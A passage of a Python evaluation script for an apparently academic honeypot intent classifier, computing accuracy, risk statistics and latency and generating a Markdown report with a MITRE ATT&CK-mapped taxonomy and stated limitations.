        "avg_risk": round(sum(risk_scores) / len(risk_scores), 2),
        "severity_distribution": severity_counts,
        "risk_by_intent": {k: {
            "min": min(v), "max": max(v),
            "avg": round(sum(v) / len(v), 2), "count": len(v)
        } for k, v in risk_by_intent.items()},
        "note": "Risk weights are project-defined constants in risk_engine.py INTENT_BASE_WEIGHTS. "
                "They were NOT modified during evaluation."
    }

    # -- TASK 7: Hybrid vs Rule comparison ------------------------------------
    print("[TASK 7] Comparing rule-only vs hybrid predictions...")
    changed_classifications = []
    for r in results:
        if str(r["rule_intent"]) != r["predicted_intent"]:
            changed_classifications.append({
                "test_id": r["test_id"],
                "expected_intent": r["expected_intent"],
                "rule_prediction": str(r["rule_intent"]),
                "hybrid_prediction": r["predicted_intent"],
                "classification_source": r["classification_source"],
                "expected_correct_by_rule": str(r["rule_intent"]) == r["expected_intent"],
                "expected_correct_by_hybrid": r["predicted_intent"] == r["expected_intent"],
            })

    gemini_invoked_count = sum(1 for r in results if r["gemini_was_used"])
    rule_only_correct = sum(1 for r in results if str(r["rule_intent"]) == r["expected_intent"])
    hybrid_correct = sum(1 for r in results if r["intent_correct"])

    hybrid_vs_rule = {
        "total_cases": len(results),
        "gemini_invoked_count": gemini_invoked_count,
        "gemini_invoked_pct": round(gemini_invoked_count / len(results) * 100, 1),
        "rule_accuracy": round(rule_only_correct / len(results), 4),
        "hybrid_accuracy": intent_metrics["accuracy"],
        "changed_classifications_count": len(changed_classifications),
        "changed_classifications": changed_classifications,
    }

    # -- TASK 8: Latency measurement ------------------------------------------
    print("[TASK 8] Measuring classification latencies...")
    latency_results = measure_latencies(rule_clf, hybrid_clf, risk_engine, n_reps=100)

    # Per-case latency stats
    rule_latencies = [r["rule_latency_ms"] for r in results]
    hybrid_latencies = [r["hybrid_latency_ms"] for r in results]
    gemini_latencies = [r["gemini_latency_ms"] for r in results if r["gemini_latency_ms"] != ""]

    latency_results.update({
        "eval_cases_rule_avg_ms": round(sum(rule_latencies) / len(rule_latencies), 4),
        "eval_cases_rule_min_ms": round(min(rule_latencies), 4),
        "eval_cases_rule_max_ms": round(max(rule_latencies), 4),
        "eval_cases_hybrid_avg_ms": round(sum(hybrid_latencies) / len(hybrid_latencies), 4),
        "eval_cases_hybrid_min_ms": round(min(hybrid_latencies), 4),
        "eval_cases_hybrid_max_ms": round(max(hybrid_latencies), 4),
        "eval_cases_gemini_count": len(gemini_latencies),
        "eval_cases_gemini_avg_ms": round(sum(gemini_latencies) / len(gemini_latencies), 4) if gemini_latencies else "N/A (Gemini not invoked)",
    })

    # -- TASK 9: Generate output files ----------------------------------------
    print("\n[TASK 9] Writing evaluation output files...")

    # (a) evaluation_dataset.csv
    dataset_path = EVAL_DIR / "evaluation_dataset.csv"
    with open(dataset_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=[
            "test_id", "expected_intent", "expected_attack_stage",
            "scenario", "event_type", "command"
        ])
        writer.writeheader()
        for case in EVALUATION_CASES:
            writer.writerow({
                "test_id": case["test_id"],
                "expected_intent": case["expected_intent"].value,
                "expected_attack_stage": case["expected_attack_stage"].value,
                "scenario": case["scenario"],
                "event_type": case["event_type"],
                "command": case.get("command") or "",
            })
    print(f"  [+] Saved: evaluation_dataset.csv ({len(EVALUATION_CASES)} rows)")

    # (b) evaluation_results.csv
    results_path = EVAL_DIR / "evaluation_results.csv"
    fieldnames = list(results[0].keys())
    with open(results_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(results)
    print(f"  [+] Saved: evaluation_results.csv ({len(results)} rows)")

    # (c) latency_results.csv
    latency_path = EVAL_DIR / "latency_results.csv"
    with open(latency_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["metric", "value", "unit", "note"])
        writer.writeheader()
        writer.writerows([
            {"metric": "rule_classification_avg", "value": latency_results["rule_classification_avg_ms"], "unit": "ms", "note": f"Average over {latency_results['repetitions']} repetitions"},
            {"metric": "rule_classification_min", "value": latency_results["rule_classification_min_ms"], "unit": "ms", "note": ""},
            {"metric": "rule_classification_max", "value": latency_results["rule_classification_max_ms"], "unit": "ms", "note": ""},
            {"metric": "hybrid_pipeline_avg", "value": latency_results["hybrid_pipeline_avg_ms"], "unit": "ms", "note": "Includes rule + risk eval"},
            {"metric": "hybrid_pipeline_min", "value": latency_results["hybrid_pipeline_min_ms"], "unit": "ms", "note": ""},
            {"metric": "hybrid_pipeline_max", "value": latency_results["hybrid_pipeline_max_ms"], "unit": "ms", "note": ""},
            {"metric": "gemini_latency_eval_avg", "value": latency_results["eval_cases_gemini_avg_ms"], "unit": "ms", "note": f"From {latency_results['eval_cases_gemini_count']} invocations during evaluation"},
        ])
    print(f"  [+] Saved: latency_results.csv")

    # (d) metrics.json
    metrics_output = {
        "evaluation_timestamp": EVAL_TIMESTAMP,
        "software_version": "v1.0-RC",
        "total_test_cases": len(EVALUATION_CASES),
        "intent_taxonomy": [i.value for i in SUPPORTED_INTENTS],
        "gemini_model": "gemini-2.5-flash",
        "gemini_enabled": gemini_clf.enabled,
        "intent_classification": {
            "accuracy": intent_metrics["accuracy"],
            "macro_precision": intent_metrics["macro_precision"],
            "macro_recall": intent_metrics["macro_recall"],
            "macro_f1": intent_metrics["macro_f1"],
            "weighted_precision": intent_metrics["weighted_precision"],
            "weighted_recall": intent_metrics["weighted_recall"],
            "weighted_f1": intent_metrics["weighted_f1"],
            "per_class": {
                cls: {k: v for k, v in vals.items() if k not in ("tp", "fp", "fn")}
                for cls, vals in intent_metrics["per_class"].items()
            },
            "averaging_method": "macro (unweighted across all classes present in ground truth) and weighted (support-weighted)"
        },
        "attack_stage_classification": {
            "accuracy": stage_metrics["accuracy"],
            "macro_precision": stage_metrics["macro_precision"],
            "macro_recall": stage_metrics["macro_recall"],
            "macro_f1": stage_metrics["macro_f1"],
            "weighted_precision": stage_metrics["weighted_precision"],
            "weighted_recall": stage_metrics["weighted_recall"],
            "weighted_f1": stage_metrics["weighted_f1"],
            "note": "Stage labels are derived from classification; some stage-intent mappings are inherently correlated.",
        },
        "risk_statistics": risk_stats,
        "hybrid_vs_rule": {k: v for k, v in hybrid_vs_rule.items() if k != "changed_classifications"},
        "changed_classifications": hybrid_vs_rule["changed_classifications"],
        "latency_ms": {
            "rule_avg": latency_results["rule_classification_avg_ms"],
            "rule_min": latency_results["rule_classification_min_ms"],
            "rule_max": latency_results["rule_classification_max_ms"],
            "hybrid_avg": latency_results["hybrid_pipeline_avg_ms"],
            "hybrid_min": latency_results["hybrid_pipeline_min_ms"],
            "hybrid_max": latency_results["hybrid_pipeline_max_ms"],
            "gemini_eval_avg": latency_results["eval_cases_gemini_avg_ms"],
            "gemini_eval_count": latency_results["eval_cases_gemini_count"],
        }
    }
    metrics_path = EVAL_DIR / "metrics.json"
    with open(metrics_path, "w", encoding="utf-8") as f:
        json.dump(metrics_output, f, indent=2, default=str)
    print(f"  [+] Saved: metrics.json")

    # (e) confusion_matrix.png - intent
    cm_intent_labels = sorted(set(y_true_intent + y_pred_intent))
    cm = build_confusion_matrix(y_true_intent, y_pred_intent, cm_intent_labels)
    plot_confusion_matrix(cm, cm_intent_labels, EVAL_DIR / "confusion_matrix.png")

    # (f) intent_distribution.png
    plot_intent_distribution(y_true_intent, y_pred_intent, EVAL_DIR / "intent_distribution.png")

    # (g) risk_distribution.png
    plot_risk_distribution(results, EVAL_DIR / "risk_distribution.png")

    # -- Print summary tables -------------------------------------------------
    print("\n" + "=" * 70)
    print("[TASK 10] RESULTS SUMMARY")
    print("=" * 70)

    print("\n--- Intent Classification Metrics -----------------------------------")
    print(f"  {'Metric':<30} {'Value':>10}")
    print(f"  {'-'*42}")
    print(f"  {'Accuracy':<30} {intent_metrics['accuracy']:>10.4f}")
    print(f"  {'Macro Precision':<30} {intent_metrics['macro_precision']:>10.4f}")
    print(f"  {'Macro Recall':<30} {intent_metrics['macro_recall']:>10.4f}")
    print(f"  {'Macro F1':<30} {intent_metrics['macro_f1']:>10.4f}")
    print(f"  {'Weighted Precision':<30} {intent_metrics['weighted_precision']:>10.4f}")
    print(f"  {'Weighted Recall':<30} {intent_metrics['weighted_recall']:>10.4f}")
    print(f"  {'Weighted F1':<30} {intent_metrics['weighted_f1']:>10.4f}")

    print("\n--- Per-Class Metrics -----------------------------------------------")
    print(f"  {'Intent':<25} {'Prec':>6} {'Rec':>6} {'F1':>6} {'Supp':>6}")
    print(f"  {'-'*52}")
    for cls, m in intent_metrics["per_class"].items():
        if m["support"] > 0 or m["tp"] + m["fp"] > 0:
            print(f"  {cls:<25} {m['precision']:>6.4f} {m['recall']:>6.4f} {m['f1']:>6.4f} {m['support']:>6}")

    print("\n--- Attack Stage Metrics --------------------------------------------")
    print(f"  Accuracy         : {stage_metrics['accuracy']:.4f}")
    print(f"  Macro F1         : {stage_metrics['macro_f1']:.4f}")
    print(f"  Weighted F1      : {stage_metrics['weighted_f1']:.4f}")

    print("\n--- Risk Statistics -------------------------------------------------")
    print(f"  Min Risk         : {risk_stats['min_risk']}")
    print(f"  Max Risk         : {risk_stats['max_risk']}")
    print(f"  Avg Risk         : {risk_stats['avg_risk']}")
    print(f"  Severity Dist    : {risk_stats['severity_distribution']}")

    print("\n--- Hybrid vs Rule Analysis -----------------------------------------")
    print(f"  Gemini invoked   : {hybrid_vs_rule['gemini_invoked_count']}/{len(results)} cases ({hybrid_vs_rule['gemini_invoked_pct']}%)")
    print(f"  Rule accuracy    : {hybrid_vs_rule['rule_accuracy']:.4f}")
    print(f"  Hybrid accuracy  : {hybrid_vs_rule['hybrid_accuracy']:.4f}")
    print(f"  Changed preds    : {hybrid_vs_rule['changed_classifications_count']} cases")
    if changed_classifications:
        print("  Changed cases:")
        for ch in changed_classifications:
            arrow = "PASS" if ch["expected_correct_by_hybrid"] else "FAIL"
            print(f"    [{arrow}] {ch['test_id']}: rule={ch['rule_prediction']} -> hybrid={ch['hybrid_prediction']} (expected={ch['expected_intent']})")

    print("\n--- Latency Results -------------------------------------------------")
    print(f"  Rule avg         : {latency_results['rule_classification_avg_ms']} ms")
    print(f"  Rule min/max     : {latency_results['rule_classification_min_ms']} / {latency_results['rule_classification_max_ms']} ms")
    print(f"  Hybrid avg       : {latency_results['hybrid_pipeline_avg_ms']} ms")
    print(f"  Hybrid min/max   : {latency_results['hybrid_pipeline_min_ms']} / {latency_results['hybrid_pipeline_max_ms']} ms")
    print(f"  Gemini (eval)    : {latency_results['eval_cases_gemini_avg_ms']} ms ({latency_results['eval_cases_gemini_count']} invocations)")

    # -- Write evaluation_report.md --------------------------------------------
    _write_evaluation_report(
        intent_metrics, stage_metrics, risk_stats,
        hybrid_vs_rule, latency_results, changed_classifications
    )

    print("\n" + "=" * 70)
    print("  [+] ALL PHASE 9 EVALUATION TASKS COMPLETE")
    print(f"  [+] Output directory: {EVAL_DIR}")
    print("=" * 70 + "\n")

    return metrics_output


def _write_evaluation_report(intent_metrics, stage_metrics, risk_stats,
                              hybrid_vs_rule, latency_results, changed_classifications):
    """Write the structured Markdown evaluation report."""
    report_path = EVAL_DIR / "evaluation_report.md"
    n = intent_metrics["per_class"]
    total = sum(m["support"] for m in n.values())

    lines = [
        "# Phase 9 - Experimental Evaluation Report",
        "## Intent-Aware Deception System for Real-Time Attacker Profiling - v1.0 RC",
        "",
        "---",
        "",
        "## Task 11 - Reproducibility: Evaluation Environment",
        "",
        "| Parameter | Value |",
        "| :--- | :--- |",
        f"| Evaluation Date/Time | {EVAL_TIMESTAMP} |",
        f"| Software Version | v1.0 Release Candidate |",
        f"| Python Version | {sys.version.split()[0]} |",
        f"| Total Test Cases | {total} |",
        f"| Intent Categories | {len(SUPPORTED_INTENTS)} |",
        f"| Gemini Model | gemini-2.5-flash |",
        f"| Gemini Enabled | Checked at runtime (GEMINI_ENABLED env var) |",
        f"| Rule Engine | Deterministic regex + event-type matching |",
        f"| Metric Averaging | Macro (unweighted) and Weighted (support-weighted) |",
        f"| Cowrie Version | 3.0.12 (WSL2 Ubuntu) |",
        f"| Platform | Windows 11 + WSL2 Ubuntu |",
        f"| MongoDB | 7.x (local) |",
        f"| API Framework | FastAPI 0.115+ |",
        f"| Note | No production code was modified during evaluation. |",
        "",
        "---",
        "",
        "## Task 1 - Implemented Intent Taxonomy",
        "",
        "The following 10 intent categories are implemented in the frozen v1.0 classifier",
        "([`backend/app/models/intent.py`](../../backend/app/models/intent.py),",
        "[`backend/app/services/rule_classifier.py`](../../backend/app/services/rule_classifier.py)):",
        "",
        "| # | Intent Category | MITRE ATT&CK Mapping | Rule IDs |",
        "| :--- | :--- | :--- | :--- |",
        "| 1 | RECONNAISSANCE | Reconnaissance (TA0043) | RULE_RECON_01 |",
        "| 2 | DISCOVERY | Discovery (TA0007) | RULE_DISC_01 |",
        "| 3 | CREDENTIAL_ACCESS | Credential Access (TA0006) | RULE_CRED_01, RULE_CRED_02 |",
        "| 4 | EXECUTION | Execution (TA0002) | RULE_EXEC_01, RULE_EXEC_02 |",
        "| 5 | PRIVILEGE_ESCALATION | Privilege Escalation (TA0004) | RULE_PRIVESC_01, RULE_PRIVESC_02 |",
        "| 6 | PERSISTENCE | Persistence (TA0003) | RULE_PERSIST_01, RULE_PERSIST_02 |",
        "| 7 | EXPLOITATION | Execution (TA0002) | RULE_EXPLOIT_01 |",
        "| 8 | EXFILTRATION | Exfiltration (TA0010) | RULE_EXFIL_01 |",
        "| 9 | CLEANUP | Defense Evasion (TA0005) | RULE_CLEAN_01 |",
        "| 10 | OTHER | Initial Access / Unknown | Fallback |",
        "",
        "---",
        "",
        "## Task 4 - Intent Classification Results",
        "",
        "**Averaging method**: Macro averages are computed as unweighted arithmetic means across all classes",
        "present in the ground truth. Weighted averages are computed as support-weighted means.",
        "",
        "### Aggregate Metrics",
        "",
        "| Metric | Value |",
        "| :--- | ---: |",
        f"| Accuracy | **{intent_metrics['accuracy']:.4f}** |",
        f"| Macro Precision | {intent_metrics['macro_precision']:.4f} |",
        f"| Macro Recall | {intent_metrics['macro_recall']:.4f} |",
        f"| Macro F1 | {intent_metrics['macro_f1']:.4f} |",
        f"| Weighted Precision | {intent_metrics['weighted_precision']:.4f} |",
        f"| Weighted Recall | {intent_metrics['weighted_recall']:.4f} |",
        f"| Weighted F1 | {intent_metrics['weighted_f1']:.4f} |",
        f"| Total Cases | {total} |",
        "",
        "### Per-Class Metrics (Intent | Precision | Recall | F1 | Support)",
        "",
        "| Intent | Precision | Recall | F1 | Support |",
        "| :--- | ---: | ---: | ---: | ---: |",
    ]
    for cls, m in sorted(intent_metrics["per_class"].items()):
        if m["support"] > 0 or m["tp"] + m["fp"] > 0:
            lines.append(f"| {cls} | {m['precision']:.4f} | {m['recall']:.4f} | {m['f1']:.4f} | {m['support']} |")

    lines += [
        "",
        "---",
        "",
        "## Task 5 - Attack Stage Classification",
        "",
        "| Metric | Value |",
        "| :--- | ---: |",
        f"| Accuracy | {stage_metrics['accuracy']:.4f} |",
        f"| Macro Precision | {stage_metrics['macro_precision']:.4f} |",
        f"| Macro Recall | {stage_metrics['macro_recall']:.4f} |",
        f"| Macro F1 | {stage_metrics['macro_f1']:.4f} |",
        f"| Weighted F1 | {stage_metrics['weighted_f1']:.4f} |",
        "",
        "> **Note**: Attack stage labels in this system are deterministically derived from rule matches.",
        "> The stage evaluation is therefore tightly correlated with intent evaluation; it does not",
        "> represent an independent classification axis.",
        "",
        "---",
        "",
        "## Task 6 — Risk Score Analysis",
        "",
        "> **Important**: Risk weights are project-defined constants in `risk_engine.py`.",
        "> They were **not modified** during this evaluation.",
        "",
        "| Metric | Value |",
        "| :--- | ---: |",
        f"| Minimum Risk Score | {risk_stats['min_risk']} |",
        f"| Maximum Risk Score | {risk_stats['max_risk']} |",
        f"| Average Risk Score | {risk_stats['avg_risk']} |",
        "",
        "**Severity Distribution:**",
        "",
        "| Severity Tier | Count |",
        "| :--- | ---: |",
    ]
    for sev, count in sorted(risk_stats["severity_distribution"].items()):
        lines.append(f"| {sev} | {count} |")

    lines += [
        "",
        "**Average Risk Score by Intent:**",
        "",
        "| Intent | Min | Avg | Max | Cases |",
        "| :--- | ---: | ---: | ---: | ---: |",
    ]
    for intent, stats in sorted(risk_stats["risk_by_intent"].items()):
        lines.append(f"| {intent} | {stats['min']} | {stats['avg']} | {stats['max']} | {stats['count']} |")

    lines += [
        "",
        "---",
        "",
        "## Task 7 — Hybrid vs Rule-Only Analysis",
        "",
        "| Metric | Value |",
        "| :--- | ---: |",
        f"| Gemini Invocations | {hybrid_vs_rule['gemini_invoked_count']} / {hybrid_vs_rule['total_cases']} ({hybrid_vs_rule['gemini_invoked_pct']}%) |",
        f"| Rule-Only Accuracy | {hybrid_vs_rule['rule_accuracy']:.4f} |",
        f"| Hybrid Accuracy | {hybrid_vs_rule['hybrid_accuracy']:.4f} |",
        f"| Changed Predictions | {hybrid_vs_rule['changed_classifications_count']} |",
        "",
    ]
    if changed_classifications:
        lines += [
            "**Changed Classifications (Rule → Hybrid):**",
            "",
            "| Test ID | Expected | Rule Pred | Hybrid Pred | Hybrid Correct? |",
            "| :--- | :--- | :--- | :--- | :---: |",
        ]
        for ch in changed_classifications:
            lines.append(f"| {ch['test_id']} | {ch['expected_intent']} | {ch['rule_prediction']} | {ch['hybrid_prediction']} | {'✓' if ch['expected_correct_by_hybrid'] else '✗'} |")
    else:
        lines.append("No classification changes observed between rule-only and hybrid predictions.")

    lines += [
        "",
        "---",
        "",
        "## Task 8 — Classification Latency",
        "",
        "| Stage | Avg (ms) | Min (ms) | Max (ms) |",
        "| :--- | ---: | ---: | ---: |",
        f"| Rule Classifier (100 reps) | {latency_results['rule_classification_avg_ms']} | {latency_results['rule_classification_min_ms']} | {latency_results['rule_classification_max_ms']} |",
        f"| Hybrid Pipeline (100 reps) | {latency_results['hybrid_pipeline_avg_ms']} | {latency_results['hybrid_pipeline_min_ms']} | {latency_results['hybrid_pipeline_max_ms']} |",
        f"| Gemini API (eval runs) | {latency_results['eval_cases_gemini_avg_ms']} | N/A | N/A |",
        "",
        "> **Note**: Latency measurements are indicative of local development performance.",
        "> Gemini API latency depends on network and API load. Production-grade performance",
        "> claims are not made from these measurements.",
        "",
        "---",
        "",
        "## Limitations",
        "",
        "1. **Dataset size**: 42 test cases is appropriate for coverage demonstration but insufficient",
        "   for statistical significance in a production threat detection context.",
        "2. **Synthetic events**: Test cases are constructed NormalizedEvent objects with typical",
        "   Cowrie field values. While they mirror real telemetry structure, they are not raw Cowrie JSON.",
        "3. **Stage correlation**: Attack stage classification is derived from intent rule matches,",
        "   not an independent model. Stage accuracy is therefore not fully independent of intent accuracy.",
        "4. **Gemini variability**: Gemini responses are probabilistic. The Gemini latency and",
        "   classification may vary between runs. Temperature=0.1 is set to minimize variability.",
        "5. **Isolated environment**: All testing was conducted in an isolated local honeypot.",
        "   No external systems were targeted.",
        "6. **Risk weight subjectivity**: INTENT_BASE_WEIGHTS are project-defined constants and",
        "   have not been empirically calibrated against real-world threat data.",
        "",
        "---",
        "",
        "## Generated Files",
        "",
        "| File | Description |",
        "| :--- | :--- |",
        "| `evaluation_dataset.csv` | 42 labelled test cases with expected intent and stage |",
        "| `evaluation_results.csv` | Per-case prediction, confidence, risk, source, and correctness |",
        "| `metrics.json` | All aggregate metrics, per-class metrics, risk stats, and latency |",
        "| `confusion_matrix.png` | Intent confusion matrix heatmap |",
        "| `intent_distribution.png` | Ground truth vs predicted intent bar chart |",
        "| `risk_distribution.png` | Risk score histogram with severity tier overlays |",
        "| `latency_results.csv` | Classification latency measurements |",
        "| `evaluation_report.md` | This document |",
    ]

    with open(report_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"  [+] Saved: evaluation_report.md")


if __name__ == "__main__":
    run_evaluation()
